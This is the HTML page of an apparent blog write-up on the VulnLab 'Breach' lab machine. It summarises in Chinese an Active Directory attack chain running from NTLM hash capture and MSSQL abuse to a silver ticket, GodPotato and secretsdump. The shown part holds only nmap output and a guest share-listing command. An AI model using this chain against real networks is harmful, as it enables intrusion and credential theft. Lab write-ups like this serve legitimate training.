@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;9e9f10f7-a960-436b-95d9-c1b812f24c57 首先，通過匿名共享目錄的方式，成功列出目錄並使用 –rid-brute 技術獲取所有用戶名。接著，作者嘗試在共享目錄中放置文件以捕獲 NTLM hash，並使用工具如 responder 和 smbmap 來抓取和上傳文件。成功獲得 has">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnLab - Machine - Breach">
+<meta property="og:url" content="https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;9e9f10f7-a960-436b-95d9-c1b812f24c57 首先，通過匿名共享目錄的方式，成功列出目錄並使用 –rid-brute 技術獲取所有用戶名。接著，作者嘗試在共享目錄中放置文件以捕獲 NTLM hash，並使用工具如 responder 和 smbmap 來抓取和上傳文件。成功獲得 has">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106083226-5279oa8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106064436-o26gbot.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106064613-9hor5gi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106070034-66qyjfj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106065933-lrjbxca.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106070141-wvit9nq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106073658-l14mjkt.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106073721-n8en9o0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106073736-yva0asv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106073825-u8xk3xt.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106081558-3ud5unm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106081606-dgwnu11.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106081534-uppglgi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106081909-3jhnq7d.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250107084440-0h4wdtm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106081952-2uzx1jl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106082129-i0p8bi9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106082307-jovusfq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106082414-yfna6wn.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106082631-746w887.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106083003-plxt8y3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106083419-tfopdgi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106083858-culb81h.png">
+<meta property="article:published_time" content="2025-01-06T00:57:20.000Z">
+<meta property="article:modified_time" content="2025-01-19T03:03:31.764Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106083226-5279oa8.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnLab - Machine - Breach</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/11/2025/15-vulnlab-Barrier/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/06/2025/13-vulnlab-Bamboo/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&text=VulnLab - Machine - Breach"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&title=VulnLab - Machine - Breach"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&is_video=false&description=VulnLab - Machine - Breach"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Breach&body=Check out this article: https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&title=VulnLab - Machine - Breach"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&title=VulnLab - Machine - Breach"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&title=VulnLab - Machine - Breach"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&title=VulnLab - Machine - Breach"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&name=VulnLab - Machine - Breach&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/06/2025/14-vulnlab-Breach/&t=VulnLab - Machine - Breach"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnLab - Machine - Breach
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-06T00:57:20.000Z" class="dt-published" itemprop="datePublished">2025-01-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106083226-5279oa8.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=9e9f10f7-a960-436b-95d9-c1b812f24c57">https://api.vulnlab.com/api/v1/share?id=9e9f10f7-a960-436b-95d9-c1b812f24c57</a></p>
+<p>首先，通過匿名共享目錄的方式，成功列出目錄並使用 –rid-brute 技術獲取所有用戶名。接著，作者嘗試在共享目錄中放置文件以捕獲 NTLM hash，並使用工具如 responder 和 smbmap 來抓取和上傳文件。成功獲得 hash 後，作者破解了它，發現是一個普通用戶的憑證。由於 mssql 端口開啟，作者利用 xp_dirtree 權限進一步獲取 hash，並成功還原密碼。擁有服務賬號後，作者進行了 sliver ticket attack，模擬成管理員並開啟 xp_cmdshell，獲得了 shell。隨後，作者使用 netexec 獲取 SID，並通過 NTLM Password Hasher 生成 hash，製作票據後進行 pass the ticket 攻擊，成功獲得管理員權限。最終，作者利用 SeImpersonatePrivilege 權限，通過 godpotato 技術獲得 NTSystem，並增加管理員以使用 secretsdump，進一步獲取管理員賬號的 hash。</p>
+<h1 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-05 22:03:53Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.10.103.36:1433:</span><br><span class="line">|     Target_Name: BREACH</span><br><span class="line">|     NetBIOS_Domain_Name: BREACH</span><br><span class="line">|     NetBIOS_Computer_Name: BREACHDC</span><br><span class="line">|     DNS_Domain_Name: breach.vl</span><br><span class="line">|     DNS_Computer_Name: BREACHDC.breach.vl</span><br><span class="line">|     DNS_Tree_Name: breach.vl</span><br><span class="line">|_    Product_Version: 10.0.20348</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.10.103.36:1433:</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2019 RTM</span><br><span class="line">|       number: 15.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2019</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: <span class="literal">false</span></span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Issuer: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-01-05T21:47:27</span><br><span class="line">| Not valid after:  2055-01-05T21:47:27</span><br><span class="line">| MD5:   2c4d:a2c0:3954:e3d4:6c30:9e6c:4a00:7e26</span><br><span class="line">| SHA-1: 8f07:6053:a64b:cf46:7bdc:c2cf:1ee3:2f17:bc9c:bc00</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIDADCCAeigAwIBAgIQUVM0ULi/tblIZtL3qEvjtjANBgkqhkiG9w0BAQsFADA7</span><br><span class="line">| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA</span><br><span class="line">| bABsAGIAYQBjAGswIBcNMjUwMTA1MjE0NzI3WhgPMjA1NTAxMDUyMTQ3MjdaMDsx</span><br><span class="line">| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs</span><br><span class="line">| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPCMQ0Hj</span><br><span class="line">| RPSmi7zT/5BBmaWJg4SPGNpgnEtJ0+iiUV21Q+dZreBe4UjwacAdXLF8WxybxmKs</span><br><span class="line">| +NXhQ1yGjyBp6+aMRvqPHRHBAKvwQB7uzXJLi97TNgoGzWamCCG5OSCsGe76xgqG</span><br><span class="line">| 83dNMEPk0kdSdkGzGo8duKXvxfLv3E5yeSxhbdR6mygDBWTp9lAx7R3SF4zVT/WD</span><br><span class="line">| AA/7XiXneJKD+FN7c//Qxw6j48ekp2FpLoz688Wz7hxznd83O4DLoydsxLtZYzUM</span><br><span class="line">| 0jFc6d2Tefd3budrY5WTgxjnIUdMMAmA5DiwEop6vQzoa08amy4Zrs7V1Sk2E9l4</span><br><span class="line">| QWZulId4MRUIvxECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEA5DABL6oLJMK6vee/</span><br><span class="line">| fD/6nhfgUWX1mJZ/FieNtNKJVRRWC7iXgmUxWf7wEknZbhbhFI0F39G23WLQ6YTR</span><br><span class="line">| rQKlxxXHUEG8H5Qd5KoQ+GoW4cQOj6QZqAQ9bX79DDTkcGWARPTnEkuIbvajc9j8</span><br><span class="line">| Dok4RuVCsvnsZYBWC6pxvAhnUvvkFahp9AJ1gZC6D1ydM3EzjYi/0dm+dS4zw1sm</span><br><span class="line">| Hc8IgKE3K+wlMFeiZ2n/lHERNKyMku3y7gNyiM3W+tFHYAQuZa2I/+WlZBn3ThYi</span><br><span class="line">| ozYHzUL3qrSI1IgAwx6Iz0agn1d67g/1P+rPK8osFr+HcPaNzDaLqq3mMzhpxLE4</span><br><span class="line">| hYlUPQ==</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-01-05T22:05:24+00:00; -13s from scanner time.</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=BREACHDC.breach.vl</span><br><span class="line">| Issuer: commonName=BREACHDC.breach.vl</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-01-04T21:46:39</span><br><span class="line">| Not valid after:  2025-07-06T21:46:39</span><br><span class="line">| MD5:   e703:3eb9:238d:242a:5a06:dd86:137e:7d0b</span><br><span class="line">| SHA-1: ef07:d63f:e575:8b3a:0386:a4a7:732a:7a14:cc31:9bd1</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIC6DCCAdCgAwIBAgIQZunmWWRos5xIVhQsbMAEyDANBgkqhkiG9w0BAQsFADAd</span><br><span class="line">| MRswGQYDVQQDExJCUkVBQ0hEQy5icmVhY2gudmwwHhcNMjUwMTA0MjE0NjM5WhcN</span><br><span class="line">| MjUwNzA2MjE0NjM5WjAdMRswGQYDVQQDExJCUkVBQ0hEQy5icmVhY2gudmwwggEi</span><br><span class="line">| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCuZxhGglNwife3Km1oSSbMDHjp</span><br><span class="line">| or8h9Cl9FI8pLrZbDfV9bM8iYv/hrS1NTtxNVgi+7DwlPngwzT+5Z358slvL2VwU</span><br><span class="line">| 43T49MMiMi1LmnBowNFBIZA2N+7TI+z0yQTzVRjzj/lUoRF5UQ/fp3CMh98i9mHF</span><br><span class="line">| 26UrLYOK+UJmRpvMg1B1uWTeOOibsn4UMPrzpndfDkQeXgBeb8tXaQ7/nR2Uij+y</span><br><span class="line">| UsWdBb8PA0iAtTAv1nYSPgMBDAPiID3+Huqo1/JeZcRyN3iVYVfTJrDK0v1r8saM</span><br><span class="line">| qHXbOnRFPX7jpLH7GU47xlyAtQNxQ0dI2U6QkcP9cs/hv6fHV1FCIAzwt4vJAgMB</span><br><span class="line">| AAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG</span><br><span class="line">| 9w0BAQsFAAOCAQEACyVHdBiFARnqresFKaDV6U+nmHKxeHxUbZhn7KapbCu+LovU</span><br><span class="line">| QdxQRQn9zsnAPw+s1/4KviUdubHaGxCi/cvUwlG5M+Dtd0KLrSaTIpcijtJbluEk</span><br><span class="line">| yuEYgNqk4Yra11mk9dOaue6/vJiXMs+VIDMTnzzMo+NT9NxUHuimhkjCaS6fmaVB</span><br><span class="line">| HFQpJtErcgG7A4vMs2HlH8ApSjQlmZS4oYFMKWFkzEnP6219KOkzahBJX7WuyqXz</span><br><span class="line">| 0ALmkTgEV8Ab593BnDKb3NjZ9BJx92/PBS7MN06zCBWFmkOd22QfESyK8gIFkInE</span><br><span class="line">| lQcZ66a5ZR46NFGabZ0yC2lZ634Ad8AJhkclfQ==</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: BREACH</span><br><span class="line">|   NetBIOS_Domain_Name: BREACH</span><br><span class="line">|   NetBIOS_Computer_Name: BREACHDC</span><br><span class="line">|   DNS_Domain_Name: breach.vl</span><br><span class="line">|   DNS_Computer_Name: BREACHDC.breach.vl</span><br><span class="line">|   DNS_Tree_Name: breach.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-01-05T22:04:44+00:00</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-01-05T22:05:23+00:00; -13s from scanner time.</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">52356/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">58684/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">58906/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>是個標準的 AD。</p>
+<h1 id="Enumerate-shared-folders"><a href="#Enumerate-shared-folders" class="headerlink" title="Enumerate shared folders"></a>Enumerate shared folders</h1><p>嘗試下匿名共享目錄，看看有什麽文件夾：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.10.103.36 -u <span class="string">&#x27;guest&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --shares</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/14-vulnlab-Breach/image-20250106064436-o26gbot.png" alt="image">​</p>
